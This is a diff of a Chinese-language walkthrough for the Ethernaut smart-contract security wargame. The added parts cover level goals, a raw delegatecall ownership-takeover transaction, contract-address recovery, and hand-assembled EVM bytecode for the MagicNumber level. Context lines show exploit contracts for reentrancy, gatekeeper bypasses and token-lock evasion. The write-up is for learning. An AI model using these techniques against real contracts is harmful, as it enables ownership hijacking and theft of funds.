@@ -2,12 +2,15 @@
 
 网址：https://ethernaut.openzeppelin.com
 
-### Hello Ethernaut
+### 0. Hello Ethernaut
 
 **目的**：  熟悉ethernaut环境, 照着敲代码即可
 
-### Fallback
-
+### 1. Fallback
+**目的**： 
+1. 获取owner权限
+2. 将合约balance全部取出
+ 
 **考点**： fallback函数的运行机制
 
 合约fallback函数在接收转账或用户调用此合约不存在的函数时触发。
@@ -34,7 +37,9 @@ contract.withdraw()
 ```
 **如何避免**： 谨慎处理fallback函数逻辑
 
-### Fallout
+### 2. Fallout
+**目的**： 获取owner权限
+
 **考点**： 构造函数名称需要与contract名称一致
 
 构造函数名称必须与contract同名；否则会作为普通函数处理。
@@ -52,7 +57,9 @@ contract Rubixi {
 
 **如何避免**： 检查abi，版本0.4.22后直接使用constructor关键字声明构造函数。
 
-### Coin Flip
+### 3. Coin Flip
+**目的**： 连赢10次
+
 **考点**： 合约中随机数的使用
 
 本例使用last block hash作为随机数，而通过合约调用此合约可以很容易的获得该值
@@ -120,7 +127,9 @@ contract CoinFlipCaller{
 
 **如何避免**： 不要使用时间，last blockhash 等与区块相关的值做随机数，时间可以被矿工操控，last blockhash是确定的，即使未来的区块值都是可以操控的；使用真随机数服务避免此问题
 
-### Telephone
+### 4. Telephone
+
+**目的**：获取owner权限
 
 **考点**： tx.origin与msg.sender区别
 
@@ -156,7 +165,7 @@ contract hacker {
 
 尽量不要使用tx.origin进行转账相关操作，除非知道自己在做什么
 
-### Token
+### 5. Token
 **目的**： 使player的balance大于20
 
 **考点**： 整形溢出
@@ -171,15 +180,15 @@ contract.transfer( instance, 21)
 **如何避免**：
 运算前判断，可使用SafeMath库
 
-### Delegation
+### 6. Delegation
 **目的**： 获取owner权限
 
 **考点**： delegatcall原理
 
 黑客利用delegatecall使用外部合约代码而改变内部状态的特性进行攻击。
-delegatecall就相当于将所调用的外部代码放入内部代码执行
+delegatecall就相当于将所调用的外部代码放入内部代码执行，但改变的状态变量的位置与delegatecall合约中的slot位置相同。
 
-示例：
+**代码**：
 ```
 pragma solidity ^0.4.18;
 
@@ -213,9 +222,15 @@ contract Delegation {
   }
 }
 ```
-只需要给Delegation地址发送交易，data为keccak256("pwn()"),即可改变delegation合约的owner
+**解题步骤**：
+给Delegation地址发送交易，data为keccak256("pwn()"),即可改变触发Delegation的fallback函数,从而执行delegate.delegatecall(msg.data)，即改变Delegation中slot为0的值为msg.sender。而Delegation中slot为0的变量是owner，从而改变owner为msg.sender。
 
-### Force
+```
+eth.sendTransaction({from:player,to:instance,data:'0xdd365b8b'})
+```
+
+
+### 7. Force
 
 **目的**： 使合约balance大于0
 
@@ -252,10 +267,7 @@ contract ForceCaller{
 **如何避免**：
 所以不要在合约中通过判断 this.balance == 0 来执行重要逻辑
 
-
-
-
-### Vault
+### 8. Vault
 **目的**： 使unclock为true
 
 **考点**： storage变量存储原理
@@ -295,7 +307,7 @@ contract Vault {
 所以在合约中存储密码等敏感信息需要像在中心化数据库中存储一样考虑其安全性，如对密码加密或只存储密码hash
 
 
-### King
+### 9. King
 **目的**：使King合约不能再继续下去
 
 **攻击方法**：当King合约向king转账时，king不能接收货币则此玩法不能再继续；这里是通过“没有payable fallback函数的合约” 调用“King合约”而使该合约地址成为king，别人再无法成功调用King合约的fallback函数
@@ -348,7 +360,9 @@ contract KingCall {
     
 }
 ```
-### Re-entrancy
+### 10. Re-entrancy
+**目的**：将合约中所有余额转出
+
 **相关事件**：DAO事件中黑客利用此漏洞窃取所有资产
 
 **考点**： 重入攻击
@@ -417,7 +431,7 @@ contract Hacker {
 ```
 
 
-### Elevator
+### 11. Elevator
 **目的**：使top值为true
 
 **考点**：view修饰的函数并不是不能修改状态变量，只是发出警告不建议修改
@@ -486,7 +500,7 @@ contract myBuilding1 is Building {
     }
 }
 ```
-### Privacy
+### 12. Privacy
 **目的**：使unlcok值为true
 
 **考点**：eth.getStorageAt获取合约中storage变量的值，定长基本类型的值每32字节为一个storage slot；小余32字节的变量会按照变量声明的次序进行存储，多个合并在一个32字节中存储。直到放不下下一个变量，再开辟新空间进行存储。
@@ -540,7 +554,7 @@ contract Privacy {
 >
 > bytes32的参数的传递形式为"0x0000000000000000000000000000000000000000000000000000000000000123",bytes16形式为"0x00000000000000000000000000000123"; bytes32数组为["0x0000000000000000000000000000000000000000000000000000000000000123","0x0000000000000000000000000000000000000000000000000000000000000456","0x0000000000000000000000000000000000000000000000000000000000000789"]
 
-### GateKeeperOne
+### 13. GateKeeperOne
 **目的**：修改entrant值为player
 
 **考点**： 
@@ -596,7 +610,7 @@ contract attacker{
     }
 }
 ```
-### GatekeeperTwo
+### 14. GatekeeperTwo
 **目的**： 修改entrant值为player
 
 **考点**
@@ -649,7 +663,7 @@ contract attacker{
     }
 }
 ```
-### Naught Coin
+### 15. Naught Coin
 **目的**：把上锁的资金转移出来
 
 **考点**: 对erc20合约的理解及继承的父合约方法的调用
@@ -665,7 +679,7 @@ contract.increaseApproval('0x887949dfb5aEd5EAD982bDf1a227e9684d270DE3','10000000
 //用0x887949dfb5aEd5EAD982bDf1a227e9684d270DE3调用合约
 contract.transferFrom('0xcfe860f5b2865941d93a3526119b9435cc2ac0b5','0x887949dfb5aEd5EAD982bDf1a227e9684d270DE3','1000000000000000000000000')
 ```
-### Preservation
+### 16. Preservation
 **目的**：修改owner为player
 
 **考点**：delegatecall执行环境，读取和修改storage变量的值时发生的事情。
@@ -734,7 +748,7 @@ contract attackContract {
   }
 }
 ```
-### Locked
+### 17. Locked
 **目的**：使unlocked为true
 
 **考点**：Unintialised Storage Pointers（未初始化的存储指针）的安全问题；
@@ -786,7 +800,198 @@ contract Locked {
     }
 }
 ```
-### Alien Codex
+### 18. Recovery
+**目的**：取回发送到新部署合约的0.5eth
+
+**考点**：合约地址的计算
+
+**解题步骤**：
+要取回0.5eth，通过调用新合约的destroy函数即可销毁该合约从而将合约所有余额发送到指定地址，但是我们怎么知道这个新合约的地址呢？
+1. 方法一：通过etherscan可以查看通过合约部署合约的地址。
+2. 方法二：合约地址其实是根据部署合约时的from与nonce计算得到的，计算公式为
+```
+//python代码
+def mk_contract_address(sender, nonce):
+    return sha3(rlp.encode([normalize_address(sender), nonce]))[12:]
+```
+
+### 19. MagicNumber
+#### 目的：
+设计一个合约使得调用合约方法whatIsTheMeaningOfLife()返回42；合约bytecode长度不能大于10字节
+
+#### 考点：对bytecode和opcodes的掌握程度
+
+##### 1. 合约编译及部署时发生了什么
+
+合约编译就是合约转换成bytecode的过程，
+编译完成的bytecode可以拆解为三个部分
+```
+//部署代码
+60606040523415600e57600080fd5b5b603680601c6000396000f300
+//合约代码
+60606040525b600080fd00
+// Auxdata
+a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029
+```
+- 创建合约时运行部署代码，部署代码的核心功能是使用CODECPY将“合约代码+ Auxdaata” 拷贝到内存(EVM将他们写到链上)
+- 合约创建成功之后当它的方法被调用时，运行合约代码
+- （可选）Auxdata是源码的加密指纹，用来验证。这只是数据，永远不会被EVM执行
+
+通过发送to为空，data为bytecode的交易部署合约
+```
+web3.eth.sendTransaction({from:eth.accounts[0],data:'0x6060...0029'})
+```
+
+*当构造函数带参数时，部署合约时的bytecode末尾还会附加参数列表的ABI编码*
+```
+{
+  "data": constructorCode + contractCode + auxdata + constructorData
+}
+```
+
+##### 2. 合约部署完成后合约地址将只存放“contractCode + Auxdata”
+```
+//得到的结果为“contractCode + Auxdata”
+eth.getCode(contract_address)
+```
+##### 3. [opcodes详解参考手册](https://ethervm.io/)
+
+#### 解题步骤：
+
+##### 1. 编写bytecode
+了解了bytecode的生成原理，我们可以根据opcodes自己拼写bytecode
+1. 部署代码
+
+部署代码的核心就是将合约代码复制到内存后返回，即memory[0x0:0x0+0x0A] = address(this).code[0x0C:0x0C+0x0A]
+```
+//600A80600C6000396000F300
+600A	PUSH1 0x0A //合约代码长度
+			stack [0x0A]
+80		DUP1
+			stack [0x0A,0x0A]
+600C	PUSH1 0x0C
+			stack [0x0C,0x0A,0x0A]
+6000	PUSH1 0x0
+			stack [0x0,0x0C,0x0A,0x0A]
+39		CODECOPY 
+			memory[0x0:0x0+0x0A] = address(this).code[0x0C:0x0C+0x0A]
+6000	PUSH1 0x0
+			stack [0x0,0x0A]
+F3		RETURN 
+			return memory[0x0:0x0+0x0A]
+00		STOP
+			halts execution
+```
+2. 合约代码
+
+由于题目要求只要调用方法whatIsTheMeaningOfLife()返回42即可，而又要求合约代码长度不超过10字节，所以无论用户调用什么方法我们都返回42即可，也就不需要判断用户调用的方法签名，以下代码只有两步
+- 1. 将42（hex为0x2A）存到memory中的地址0x90中; mstore(0x90, 0x2A)
+- 2. 返回memory[0x90:0x90+0x20]
+```
+//602A60905260206090F3
+//合约代码
+
+602A	PUSH 0x2A
+6090	PUSH 0x90
+52		MSTORE
+			mstore(0x90, 0x2A)
+
+6020	PUSH 0x20
+6090	PUSH 0x90
+			stack[0x90,0x20]
+F3		RETURN
+			return memory[0x90:0x90+0x20]
+```
+3. auxdata可以省略
+
+三部分合起来后的bytecode就是：
+```
+600A80600C6000396000F300602A60905260206090F3
+```
+##### 2. 部署合约
+```
+eth.sendTransaction({from:player, data:'0x600A80600C6000396000F300602A60905260206090F3'})
+```
+部署完成后，getcode获取合约bytecode应为602A60905260206090F3
+```
+eth.getCode(contract_address)
+//结果：602A60905260206090F3
+```
+用remix获取合约实例后调用whatIsTheMeaningOfLife()返回值应为42
+
+##### 3. contract.setSolver(contract_address)
+##### 成功的其它答案
+```
+//60806040526001600A575B600A8060176000396000F300
+//部署代码
+6080	PUSH1 0x80
+			stack [0x80]
+6040	PUSH1 0x40 
+			stack [0x40,0x80]
+52		MSTORE
+			mstore(0x40:0x40+32,0x80)
+			stack []
+
+6001	PUSH1 0x1
+
+600A	PUSH1 [tag1]
+			stack [0xa, 0x1]
+57		JUMPI 
+			$pc = (0x1)? 0xa : $pc+1
+			stack [msg.value]
+
+//tag1:0xa
+5B		JUMPDEST
+
+600A	PUSH1 0x0A //合约代码长度
+			stack [0x0A]
+80		DUP1
+			stack [0x0A,0x0A]
+6017	PUSH1 0x1C
+			stack [0x1C,0x0A,0x0A]
+6000	PUSH1 0x0
+			stack [0x0,0x1D,0x0A,0x0A]
+39		CODECOPY 
+			memory[0x0:0x0+0x0A] = address(this).code[0x17:0x17+0x0A]
+6000	PUSH1 0x0
+			stack [0x0,0x0A]
+F3		RETURN 
+			return memory[0x0:0x0+0x0A]
+00		STOP
+			halts execution
+
+
+//604260905260206090F3
+//合约代码
+
+6042	PUSH 0x42
+6090	PUSH 0x90
+52		MSTORE
+			mstore8(0x90, 0x42)
+
+6020	PUSH 0x20
+6090	PUSH 0x90
+			stack[0x90,0x20]
+F3		RETURN
+			return memory[0x90:0x90+0x20]
+
+//整体： 60806040526001600A575B600A8060176000396000F300604260905260206090F3
+```
+#### 注意
+> *字节码很难调试，可以使用[反编译工具](https://ethervm.io/decompile?address=&network=)辅助*
+#### 参考链接
+1. [深入了解以太坊虚拟机](https://www.jianshu.com/p/1969f3761208)
+2. [深入了解以太坊虚拟机第2部分——固定长度数据类型的表示方法](https://www.jianshu.com/p/9df8d15418ed)
+3. [深入了解以太坊虚拟机第3部分——动态数据类型的表示方法](https://www.jianshu.com/p/af5721c79505)
+4. [深入了解以太坊虚拟机第4部分——ABI编码外部方法调用的方式](https://www.jianshu.com/p/d0e8e825d41b)
+5. [深入了解以太坊虚拟机第5部分——一个新合约被创建后会发生什么](https://www.jianshu.com/p/d9137e87c9d3)
+6. [How to deploy contracts using raw assembly opcodes](https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2)
+7. [以太坊虚拟机EVM执行原理](http://www.jouypub.com/2018/e7837187669426cba873450586b4a368/)
+
+
+
+
+### 20. Alien Codex
 
 **目的**：获取owner权限
 
@@ -870,7 +1075,7 @@ contract Locked {
 **后记**：
 solidity不会验证动态数组长度是否与实际相符导致用户可以通过动态数组访问所有storage slot。控制用户的操作数组的能力以避免此问题。
 
-### Denail
+### 21. Denail
 **目的**: 使owner无法调用成功withdraw
 
 **考点**：拒绝服务攻击
